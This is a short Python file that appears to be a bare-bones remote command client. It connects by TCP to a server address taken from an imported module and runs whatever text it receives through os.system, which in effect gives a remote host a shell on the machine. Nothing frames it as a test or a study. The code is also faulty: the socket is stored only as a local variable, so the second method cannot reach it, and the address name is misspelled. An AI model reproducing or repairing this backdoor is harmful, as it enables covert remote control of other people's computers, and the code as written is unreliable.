import socket
import os
from remote_runfile import *

class SClient:
    def __init__(self):
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(server_addres)

    def recvinstruction(self):
        instruction = client.recv(1024)
        instruction = instruction.decode()
        os.system(instruction)
